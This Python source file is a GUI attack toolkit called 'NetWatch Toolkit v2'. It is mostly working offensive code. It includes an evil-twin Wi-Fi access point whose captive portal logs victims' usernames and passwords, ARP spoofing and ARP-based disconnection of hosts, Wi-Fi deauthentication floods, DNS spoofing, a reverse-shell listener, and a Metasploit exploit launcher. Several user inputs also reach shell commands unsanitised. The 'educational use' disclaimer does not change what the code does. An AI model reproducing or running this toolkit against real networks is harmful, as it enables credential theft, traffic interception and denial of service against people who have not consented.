#!/usr/bin/env python3
"""
NetWatch Toolkit v2  (2.3)
Author: Niko DeRuise

USAGE:
    sudo python3 netwatch.py

REQUIREMENTS:
    - Python 3.x
    - nmap
    - scapy
    - tkinter
    - hostapd, dnsmasq
    - netcat (nc)
    - mitmproxy, iptables, tcpdump, iftop
    - metasploit-framework (optional for exploit launcher)

DISCLAIMER:
    For educational and authorized use only.
"""

import os
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from tkinter import *
from tkinter import ttk, filedialog, messagebox
from scapy.all import ARP, Ether, srp, send, RadioTap, Dot11, Dot11Deauth, sendp

# === Globals ===
evil_dir = "netwatch_portal"
os.makedirs(evil_dir, exist_ok=True)
portal_server = None
evil_processes = []
spoofing = False
kicking = False

def is_root():
    return os.geteuid() == 0

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    for _, r in ans:
        return r[Ether].src
    return None

def get_default_interface():
    return subprocess.getoutput("ip route | grep default | awk '{print $5}'")

# === Evil Portal HTTP Server ===
class PortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = os.path.join(evil_dir, "index.html")
        try:
            with open(path, "rb") as f:
                html = f.read()
        except:
            html = b"<form method='POST' action='/creds'><input name='user'><input name='pass'><input type='submit'></form>"
        self.send_response(200)
        self.end_headers()
        self.wfile.write(html)

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length).decode()
        creds = parse_qs(data)
        with open(os.path.join(evil_dir, "credentials.txt"), "a") as f:
            f.write(f"{self.client_address[0]} - {creds}\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<h1>Connection Failed</h1>")

def start_portal_server():
    global portal_server
    os.chdir(evil_dir)
    portal_server = HTTPServer(('0.0.0.0', 8080), PortalHandler)
    threading.Thread(target=portal_server.serve_forever, daemon=True).start()

def stop_portal_server():
    global portal_server
    if portal_server:
        portal_server.shutdown()
        portal_server = None

# === GUI Setup ===
if not is_root():
    print("[!] Please run as root.")
    exit()

root = Tk()
root.title("NetWatch Toolkit v2")
root.geometry("1200x720")
style = ttk.Style()
style.theme_use("clam")
style.configure("TNotebook.Tab", background="#222", foreground="#0ff", padding=10)
style.map("TNotebook.Tab", background=[("selected", "#0ff")])
notebook = ttk.Notebook(root)
notebook.pack(expand=1, fill='both')

def create_tab(title):
    tab = Frame(notebook, bg="#1e1e2e")
    notebook.add(tab, text=title)
    frame = Frame(tab)
    frame.pack(expand=1, fill='both')
    output = Text(frame, bg="black", fg="lime", height=10)
    scrollbar = Scrollbar(frame, command=output.yview)
    output.configure(yscrollcommand=scrollbar.set)
    scrollbar.pack(side=RIGHT, fill=Y)
    output.pack(expand=1, fill="both")
    return tab, output
	
	# === Nmap Scanner ===
tab1, nmap_output = create_tab("Nmap")
Label(tab1, text="Target IP/Range:", bg="#1e1e2e", fg="#0ff").pack()
nmap_entry = Entry(tab1); nmap_entry.pack()
def run_nmap():
    target = nmap_entry.get()
    if target:
        result = subprocess.getoutput(f"nmap -sS -Pn {target}")
        nmap_output.insert(END, result + "\n")
Button(tab1, text="Scan", command=lambda: threading.Thread(target=run_nmap).start()).pack()

# === ARP Scanner ===
tab2, arp_output = create_tab("ARP Scan")
Label(tab2, text="Network CIDR:", bg="#1e1e2e", fg="#0ff").pack()
arp_entry = Entry(tab2); arp_entry.pack()
def arp_scan():
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=arp_entry.get())
    ans, _ = srp(pkt, timeout=2, verbose=0)
    for _, r in ans:
        arp_output.insert(END, f"{r.psrc} - {r.hwsrc}\n")
Button(tab2, text="Scan", command=lambda: threading.Thread(target=arp_scan).start()).pack()

# === ARP Spoofing ===
tab3, spoof_output = create_tab("ARP Spoof")
Label(tab3, text="Target IP:", bg="#1e1e2e", fg="#0ff").pack()
spoof_target = Entry(tab3); spoof_target.pack()
Label(tab3, text="Gateway IP:", bg="#1e1e2e", fg="#0ff").pack()
spoof_gateway = Entry(tab3); spoof_gateway.pack()
def start_spoof():
    global spoofing
    spoofing = True
    def loop():
        tgt, gw = spoof_target.get(), spoof_gateway.get()
        tgt_mac, gw_mac = get_mac(tgt), get_mac(gw)
        while spoofing:
            send(ARP(op=2, pdst=tgt, psrc=gw, hwdst=tgt_mac), verbose=0)
            send(ARP(op=2, pdst=gw, psrc=tgt, hwdst=gw_mac), verbose=0)
            spoof_output.insert(END, f"Spoofing {tgt} ↔ {gw}\n")
            time.sleep(2)
    threading.Thread(target=loop).start()
def stop_spoof(): global spoofing; spoofing = False
Button(tab3, text="Start", command=start_spoof).pack()
Button(tab3, text="Stop", command=stop_spoof).pack()

# === ARP Kick ===
tab4, kick_output = create_tab("ARP Kick")
Label(tab4, text="Target IP:", bg="#1e1e2e", fg="#0ff").pack()
kick_target = Entry(tab4); kick_target.pack()
Label(tab4, text="Gateway IP:", bg="#1e1e2e", fg="#0ff").pack()
kick_gateway = Entry(tab4); kick_gateway.pack()
Label(tab4, text="Packets (default 150):", bg="#1e1e2e", fg="#0ff").pack()
kick_count = Entry(tab4); kick_count.insert(0, "150"); kick_count.pack()
def kick_loop():
    global kicking
    t, g, count = kick_target.get(), kick_gateway.get(), int(kick_count.get())
    for i in range(count):
        if not kicking: break
        send(ARP(op=2, pdst=t, psrc=g, hwdst="00:00:00:00:00:00"), verbose=0)
        kick_output.insert(END, f"Sent [{i+1}/{count}] ARP Kick to {t}\n")
        time.sleep(0.05)
    kick_output.insert(END, "✓ Kick Complete\n")
def start_kick(): global kicking; kicking = True; threading.Thread(target=kick_loop).start()
def stop_kick(): global kicking; kicking = False
Button(tab4, text="Start Kick", command=start_kick).pack()
Button(tab4, text="Stop Kick", command=stop_kick).pack()

# === Traceroute ===
tab5, trace_output = create_tab("Traceroute")
Label(tab5, text="Target:", bg="#1e1e2e", fg="#0ff").pack()
trace_entry = Entry(tab5); trace_entry.pack()
def run_trace():
    result = subprocess.getoutput(f"traceroute {trace_entry.get()}")
    trace_output.insert(END, result + "\n")
Button(tab5, text="Run Trace", command=lambda: threading.Thread(target=run_trace).start()).pack()

# === Reverse Shell ===
tab6, shell_output = create_tab("Reverse Shell")
Label(tab6, text="LPORT (e.g. 4444):", bg="#1e1e2e", fg="#0ff").pack()
shell_lport = Entry(tab6); shell_lport.insert(0, "4444"); shell_lport.pack()
def start_listener():
    port = shell_lport.get()
    shell_output.insert(END, f"Listening on port {port}...\n")
    os.system(f"x-terminal-emulator -e 'nc -lvnp {port}'")
Button(tab6, text="Start Listener", command=lambda: threading.Thread(target=start_listener).start()).pack()

# === Evil Portal ===
tab7, portal_output = create_tab("Evil Portal")
Label(tab7, text="SSID:", bg="#1e1e2e", fg="#0ff").pack()
ep_ssid = Entry(tab7); ep_ssid.insert(0, "Free_WiFi"); ep_ssid.pack()
Label(tab7, text="Interface (AP Capable):", bg="#1e1e2e", fg="#0ff").pack()
ep_iface = Entry(tab7); ep_iface.insert(0, "wlan0"); ep_iface.pack()
def choose_html():
    file = filedialog.askopenfilename()
    if file:
        with open(file, "r") as src, open(os.path.join(evil_dir, "index.html"), "w") as dst:
            dst.write(src.read())
Button(tab7, text="Select HTML Page", command=choose_html).pack()
def start_evil_ap():
    ssid, iface = ep_ssid.get(), ep_iface.get()
    hostapd_conf = f"interface={iface}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel=6\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0"
    dns_conf = f"interface={iface}\ndhcp-range=10.0.0.10,10.0.0.100,12h\naddress=/#/10.0.0.1"
    os.chdir(evil_dir)
    with open("hostapd.conf", "w") as f: f.write(hostapd_conf)
    with open("dnsmasq.conf", "w") as f: f.write(dns_conf)
    os.system(f"ip link set {iface} down")
    os.system(f"ip addr flush dev {iface}")
    os.system(f"ip addr add 10.0.0.1/24 dev {iface}")
    os.system(f"ip link set {iface} up")
    os.system("iptables -t nat -F && iptables -F")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
    os.system(f"iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 80 -j REDIRECT --to-port 8080")
    h = subprocess.Popen(["hostapd", "hostapd.conf"])
    d = subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf"])
    evil_processes.extend([h, d])
    threading.Thread(target=start_portal_server, daemon=True).start()
    portal_output.insert(END, f"[+] Evil AP '{ssid}' running on {iface}\n")
def stop_evil_ap():
    for p in evil_processes:
        try: p.terminate()
        except: pass
    os.system("killall hostapd dnsmasq")
    os.system("iptables -t nat -F && iptables -F")
    stop_portal_server()
    portal_output.insert(END, "[x] Evil Portal stopped\n")
Button(tab7, text="Start Evil Portal", command=start_evil_ap).pack()
Button(tab7, text="Stop Evil Portal", command=stop_evil_ap).pack()
Button(tab7, text="Show Captured Creds", command=lambda: portal_output.insert(END, open(os.path.join(evil_dir, "credentials.txt")).read() if os.path.exists(os.path.join(evil_dir, "credentials.txt")) else "No credentials yet\n")).pack()

# === Deauth Attack ===
tab8, deauth_output = create_tab("Deauth Attack ⚠️")
Label(tab8, text="Monitor Interface:", bg="#1e1e2e", fg="#0ff").pack()
deauth_iface = Entry(tab8); deauth_iface.pack()
Label(tab8, text="Target MAC:", bg="#1e1e2e", fg="#0ff").pack()
target_mac = Entry(tab8); target_mac.pack()
Label(tab8, text="AP MAC:", bg="#1e1e2e", fg="#0ff").pack()
ap_mac = Entry(tab8); ap_mac.pack()
def deauth():
    pkt = RadioTap()/Dot11(addr1=target_mac.get(), addr2=ap_mac.get(), addr3=ap_mac.get())/Dot11Deauth()
    sendp(pkt, iface=deauth_iface.get(), count=100, inter=0.1, verbose=0)
    deauth_output.insert(END, "Deauth packets sent.\n")
Button(tab8, text="Send Deauth", command=lambda: threading.Thread(target=deauth).start()).pack()

# === DNS Spoofing ===
tab9, dns_output = create_tab("DNS Spoofing")
Label(tab9, text="Spoofed Domain:", bg="#1e1e2e", fg="#0ff").pack()
dns_domain = Entry(tab9); dns_domain.pack()
Label(tab9, text="Redirect to IP:", bg="#1e1e2e", fg="#0ff").pack()
dns_ip = Entry(tab9); dns_ip.pack()
def dns_spoof():
    rule = f"address=/{dns_domain.get()}/{dns_ip.get()}"
    with open("dnsmasq.d/spoof.conf", "w") as f: f.write(rule)
    os.system("systemctl restart dnsmasq")
    dns_output.insert(END, f"DNS spoofing {dns_domain.get()} → {dns_ip.get()}\n")
Button(tab9, text="Spoof Domain", command=dns_spoof).pack()

# === Bandwidth Monitor ===
tab10, bw_output = create_tab("Bandwidth Monitor")
def run_iftop():
    bw_output.insert(END, "Launching iftop (requires terminal)...\n")
    os.system("x-terminal-emulator -e 'iftop'")
Button(tab10, text="Launch iftop", command=lambda: threading.Thread(target=run_iftop).start()).pack()

# === Packet Capture ===
tab11, pcap_output = create_tab("Packet Capture")
Label(tab11, text="Interface:", bg="#1e1e2e", fg="#0ff").pack()
pcap_iface = Entry(tab11); pcap_iface.insert(0, "eth0"); pcap_iface.pack()
Label(tab11, text="Output File:", bg="#1e1e2e", fg="#0ff").pack()
pcap_file = Entry(tab11); pcap_file.insert(0, "capture.pcap"); pcap_file.pack()
def capture_packets():
    iface = pcap_iface.get()
    out = pcap_file.get()
    pcap_output.insert(END, f"Capturing packets on {iface} → {out}\n")
    os.system(f"x-terminal-emulator -e 'tcpdump -i {iface} -w {out}'")
Button(tab11, text="Start Capture", command=lambda: threading.Thread(target=capture_packets).start()).pack()

# === MAC Changer ===
tab12, mac_output = create_tab("MAC Changer")
Label(tab12, text="Interface:", bg="#1e1e2e", fg="#0ff").pack()
mac_iface = Entry(tab12); mac_iface.insert(0, "eth0"); mac_iface.pack()
Label(tab12, text="New MAC (or leave blank for random):", bg="#1e1e2e", fg="#0ff").pack()
mac_value = Entry(tab12); mac_value.pack()
def change_mac():
    iface = mac_iface.get()
    mac = mac_value.get()
    os.system(f"ifconfig {iface} down")
    cmd = f"macchanger -r {iface}" if not mac else f"macchanger -m {mac} {iface}"
    os.system(cmd)
    os.system(f"ifconfig {iface} up")
    mac_output.insert(END, f"MAC changed on {iface}\n")
Button(tab12, text="Change MAC", command=lambda: threading.Thread(target=change_mac).start()).pack()

# === Firewall Manager ===
tab13, fw_output = create_tab("Firewall")
Label(tab13, text="iptables Rule:", bg="#1e1e2e", fg="#0ff").pack()
fw_rule = Entry(tab13); fw_rule.pack()
def add_rule():
    cmd = fw_rule.get()
    os.system(f"iptables {cmd}")
    fw_output.insert(END, f"Rule added: iptables {cmd}\n")
Button(tab13, text="Add Rule", command=add_rule).pack()

# === Exploit Launcher (Metasploit) ===
tab14, msf_output = create_tab("Exploit Launcher")
Label(tab14, text="Exploit Path (e.g. exploit/windows/smb/ms17_010_eternalblue):", bg="#1e1e2e", fg="#0ff").pack()
msf_exploit = Entry(tab14); msf_exploit.pack()
Label(tab14, text="RHOST:", bg="#1e1e2e", fg="#0ff").pack()
msf_rhost = Entry(tab14); msf_rhost.pack()
Label(tab14, text="LHOST:", bg="#1e1e2e", fg="#0ff").pack()
msf_lhost = Entry(tab14); msf_lhost.pack()
Label(tab14, text="LPORT:", bg="#1e1e2e", fg="#0ff").pack()
msf_lport = Entry(tab14); msf_lport.insert(0, "4444"); msf_lport.pack()
def launch_msf():
    script = f"""
use {msf_exploit.get()}
set RHOST {msf_rhost.get()}
set LHOST {msf_lhost.get()}
set LPORT {msf_lport.get()}
exploit
"""
    with open("msf.rc", "w") as f: f.write(script)
    msf_output.insert(END, "Launching exploit in terminal...\n")
    os.system("x-terminal-emulator -e 'msfconsole -r msf.rc'")
Button(tab14, text="Launch Exploit", command=lambda: threading.Thread(target=launch_msf).start()).pack()

# === Session Log Export ===
tab15, log_output = create_tab("Export Logs")
Label(tab15, text="Export File:", bg="#1e1e2e", fg="#0ff").pack()
log_file = Entry(tab15); log_file.insert(0, "netwatch_session.log"); log_file.pack()
def export_logs():
    all_logs = []
    for tab in notebook.winfo_children():
        for widget in tab.winfo_children():
            if isinstance(widget, Frame):
                for child in widget.winfo_children():
                    if isinstance(child, Text):
                        all_logs.append(child.get("1.0", END))
    with open(log_file.get(), "w") as f:
        f.write("\n\n--- NEW TAB ---\n\n".join(all_logs))
    log_output.insert(END, f"Session exported to {log_file.get()}\n")
Button(tab15, text="Export", command=export_logs).pack()

# === Reset Tab ===
tab16, reset_output = create_tab("Reset")
def reset_all():
    for tab in notebook.winfo_children():
        for widget in tab.winfo_children():
            for child in widget.winfo_children():
                if isinstance(child, Entry): child.delete(0, END)
    reset_output.insert(END, "[✓] All fields cleared\n")
Button(tab16, text="Reset Fields", command=reset_all).pack()

# === Session Manager ===
tab17, session_output = create_tab("Session Manager")
def save_session():
    with open("netwatch_session.txt", "w") as f:
        for tab in notebook.winfo_children():
            for widget in tab.winfo_children():
                for child in widget.winfo_children():
                    if isinstance(child, Entry):
                        f.write(child.get() + "\n")
    session_output.insert(END, "Session saved.\n")

def load_session():
    try:
        with open("netwatch_session.txt", "r") as f:
            values = f.readlines()
        idx = 0
        for tab in notebook.winfo_children():
            for widget in tab.winfo_children():
                for child in widget.winfo_children():
                    if isinstance(child, Entry):
                        child.delete(0, END)
                        child.insert(0, values[idx].strip())
                        idx += 1
        session_output.insert(END, "Session loaded.\n")
    except Exception as e:
        session_output.insert(END, f"Failed to load session: {e}\n")

Button(tab17, text="Save Session", command=save_session).pack()
Button(tab17, text="Load Session", command=load_session).pack()

# === Run GUI ===
root.mainloop()

